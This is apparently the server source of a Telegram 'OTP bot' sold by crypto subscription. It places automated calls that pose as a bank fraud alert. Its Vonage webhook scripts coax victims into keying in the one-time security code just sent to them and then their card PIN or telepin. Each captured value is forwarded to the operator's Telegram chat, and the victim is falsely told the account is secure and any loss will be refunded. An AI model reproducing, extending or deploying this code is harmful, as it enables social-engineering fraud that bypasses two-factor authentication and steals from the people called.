/* eslint-disable @typescript-eslint/camelcase */
/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable no-console */
import { Webhook } from 'coinbase-commerce-node';
import express from 'express';
import moment from 'moment';
import { Context, Markup, Scenes } from 'telegraf';
import { Update } from 'telegraf/typings/core/types/typegram';
import { client } from './utils/contentful';

const app = express();

app.use(express.json());

export const server = async (
  ctx: Context<Update> & {
    //@ts-expect-error
    scene: Scenes.SceneContextScene<unknown, Scenes.WizardSessionData>;
    //@ts-expect-error
    wizard: Scenes.WizardContextWizard<unknown>;
  },
): Promise<void> => {
  app.post('/coinbase-webhook', async (req, res) => {
    const body = req.body;
    const signature = req.headers['x-cc-webhook-signature'] as string;
    const webhookSecret = process.env.COINBASE_WEBHOOK_SECRET as string;

    try {
      const event = Webhook.verifyEventBody(
        JSON.stringify(body),
        signature,
        webhookSecret,
      );

      const { metadata } = body.event.data;

      if (event.type === 'charge:pending') {
        // user paid, but transaction not confirm on blockchain yet
        ctx.telegram.sendMessage(
          metadata.chatIid,
          '😁 Your payment has been received but not confirmed yet ',
        );
      }

      if (event.type === 'charge:confirmed') {
        // all good, charge confirmed
        ctx.telegram.sendMessage(
          metadata.chatIid,
          '😋 Your payment has been received',
        );
        try {
          const space = await client.getSpace(
            process.env.CONTENTFUL_SPACE as string,
          );
          const env = await space.getEnvironment('master');
          const newUser = await env.createEntry('user', {
            fields: {
              id: { 'en-US': Date.now() },
              telegramId: { 'en-US': ctx.from?.id },
              username: { 'en-US': ctx.from?.username },
              membershipExpiry: {
                'en-US': moment
                  .utc()
                  .add(1, 'month')
                  .format(),
              },
              membershipType: 'SILVER',
            },
          });

          ctx.telegram.sendMessage(
            metadata.chatId,
            '🤩 Your subsciption has been confirmed, to start send "call"',
          );
          console.log(newUser);
        } catch (error) {
          console.log(error);
        }
      }

      if (event.type === 'charge:failed') {
        // charge failed or expired
        ctx.telegram.sendMessage(
          metadata.chatIid,
          "😔 You didn't make a payment if this an error please contact admin",
        );
      }

      return res.send(`success ${event.id}`);
    } catch (error) {
      return res.status(400).send('failure!');
    }
  });

  app.post('/vonage-webhook/dtmf/:language', (req, res) => {
    const { dtmf } = req.body;

    if ((dtmf && dtmf.digits === '1') || (dtmf && dtmf.digits === '2')) {
      res.send([
        {
          action: 'talk',
          text:
            'For your security please enter the security code we have sent you followed by the # key. If you have not received the code yet please press the star key followed by the # key',
          language: req.params.language,
          style: 2,
          bargeIn: true,
        },
        {
          eventUrl: [
            `${process.env.ENDPOINT_URL}/vonage-webhook/otp/${ctx.chat?.id}/${req.params.language}`,
          ],
          action: 'input',
          type: ['dtmf'],
          dtmf: {
            submitOnHash: true,
            timeOut: 10,
            maxDigits: 18,
          },
        },
      ]);
    } else if (dtmf && dtmf.digits === '3') {
      res.send([
        {
          action: 'talk',
          text:
            'We have blocked a recent suspicious transaction if this was not you please press 1, if this was you please press 2 or to repeat these options please press 3.',
          language: req.params.language,
          style: 2,
          bargeIn: true,
        },
        {
          eventUrl: [
            `${process.env.ENDPOINT_URL}/vonage-webhook/dtmf/${req.params.language}`,
          ],
          action: 'input',
          type: ['dtmf'],
          dtmf: {
            maxDigits: 1,
            timeOut: 10,
          },
        },
      ]);
    } else {
      res.send([
        {
          action: 'talk',
          text: 'You have selected an invalid option.',
          language: req.params.language,
          style: 2,
          bargeIn: true,
        },
        {
          action: 'talk',
          text:
            'We have blocked a recent suspicious transaction if this was not you please press 1, if this was you please press 2 or to repeat these options please press 3.',
          language: req.params.language,
          style: 2,
          bargeIn: true,
        },
        {
          eventUrl: [
            `${process.env.ENDPOINT_URL}/vonage-webhook/dtmf/${req.params.language}`,
          ],
          action: 'input',
          type: ['dtmf'],
          dtmf: {
            timeOut: 10,
            maxDigits: 1,
          },
        },
      ]);
    }
  });

  app.post('/vonage-webhook/pin/:chatId/:language', async (req, res) => {
    const { dtmf } = req.body;
    if (dtmf && dtmf.digits === '*') {
      return res.send([
        {
          action: 'talk',
          text: `Okay, you might receive another automated call if we detect a security code has been sent to you.`,
          language: req.params.language,
          style: 2,
          bargeIn: true,
        },
      ]);
    }
    if (dtmf && dtmf.digits) {
      await ctx.telegram.sendMessage(
        req.params.chatId,
        req.params.language === 'en-US'
          ? `Card Pin is <b>${dtmf.digits}</b> 💳`
          : `Telepin is <b>${dtmf.digits}</b> 📟`,
        {
          parse_mode: 'HTML',
        },
      );
    }
    res.send([
      {
        action: 'talk',
        text: `Great, you have entered ${dtmf.digits}.`,
        language: req.params.language,
        style: 2,
        bargeIn: true,
      },
      {
        action: 'talk',
        text: `Your account is now secure. If the payment has already left your account, no need to worry, it will automatically be refunded to you in 24 to 48 hours, thank you goodbye.`,
        language: req.params.language,
        style: 2,
        bargeIn: true,
      },
    ]);
  });

  app.post('/vonage-webhook/otp/:chatId/:language', async (req, res) => {
    const { dtmf } = req.body;

    if (dtmf && dtmf.digits === '*') {
      res.send([
        {
          action: 'talk',
          text: `Okay, you might receive another automated call if we detect a security code has been sent to you.`,
          language: req.params.language,
          style: 2,
          bargeIn: true,
        },
      ]);

      return ctx.telegram.sendMessage(
        req.params.chatId,
        `OTP not received ❌`,
        {
          parse_mode: 'HTML',
        },
      );
    }

    if (dtmf && dtmf.digits) {
      await ctx.telegram.sendMessage(
        req.params.chatId,
        `OTP is <b>${dtmf.digits}</b> ✅`,
        {
          parse_mode: 'HTML',
        },
      );
    }
    res.send([
      {
        action: 'talk',
        text: `Great, you have entered ${dtmf.digits}.`,
        language: req.params.language,
        style: 2,
        bargeIn: true,
      },
      {
        action: 'talk',
        text:
          req.params.language === 'en-US'
            ? 'To authenticate you please enter your card pin followed by the # key'
            : 'To authenticate you please enter your telepin followed by the # key',
        language: req.params.language,
        style: 2,
        bargeIn: true,
      },
      {
        eventUrl: [
          `${process.env.ENDPOINT_URL}/vonage-webhook/pin/${ctx.chat?.id}/${req.params.language}`,
        ],
        action: 'input',
        type: ['dtmf'],
        dtmf: {
          submitOnHash: true,
          timeOut: 10,
          maxDigits: 18,
        },
      },
    ]);
  });
  app.post('/vonage-webhook', async (req, res) => {
    // eslint-disable-next-line no-console
    const { status, to } = req.body;
    if (status === 'started') {
      await ctx.telegram.sendMessage(
        ctx.chat?.id as number,
        `Calling (${to}) 📞`,
      );
    }

    if (status === 'ringing') {
      await ctx.telegram.sendMessage(
        ctx.chat?.id as number,
        `Ringing (${to}) 🔔`,
      );
    }

    if (status === 'answered') {
      await ctx.telegram.sendMessage(
        ctx.chat?.id as number,
        `On call (${to}) 🤳🏽`,
        {
          parse_mode: 'HTML',
        },
      );
    }

    if (status === 'busy') {
      await ctx.telegram.sendMessage(
        ctx.chat?.id as number,
        '<b>On another call </b> ❌\n\nCall again',
        {
          parse_mode: 'HTML',
          reply_markup: Markup.inlineKeyboard([
            Markup.button.callback('Yes', 'yes'),
            Markup.button.callback('No', 'no'),
          ]).reply_markup,
        },
      );
    }

    if (status === 'machine') {
      await ctx.telegram.sendMessage(
        ctx.chat?.id as number,
        '<b>Voicemail</b> ❌\n\nCall again',
        {
          parse_mode: 'HTML',
          reply_markup: Markup.inlineKeyboard([
            Markup.button.callback('Yes', 'yes'),
            Markup.button.callback('No', 'no'),
          ]).reply_markup,
        },
      );
    }

    if (status === 'unanswered') {
      await ctx.telegram.sendMessage(
        ctx.chat?.id as number,
        '<b>Hungup</b> ❌\n\nCall again',
        {
          parse_mode: 'HTML',
          reply_markup: Markup.inlineKeyboard([
            Markup.button.callback('Yes', 'yes'),
            Markup.button.callback('No', 'no'),
          ]).reply_markup,
        },
      );
    }

    if (status === 'completed') {
      await ctx.telegram.sendMessage(
        ctx.chat?.id as number,
        '<b>Ended</b>.\n\nCall again',
        {
          parse_mode: 'HTML',
          reply_markup: Markup.inlineKeyboard([
            Markup.button.callback('👍🏽 Yes', 'yes'),
            Markup.button.callback('👎🏽 No', 'no'),
          ]).reply_markup,
        },
      );
    }
    console.log('body: ', req.body);
    res.send({});
  });
};

const port = process.env.PORT || 4000;
app.listen(port, () =>
  // eslint-disable-next-line no-console
  console.log(`⚡⚡⚡ Server has started on http://localhost:${port}`),
);

// server();
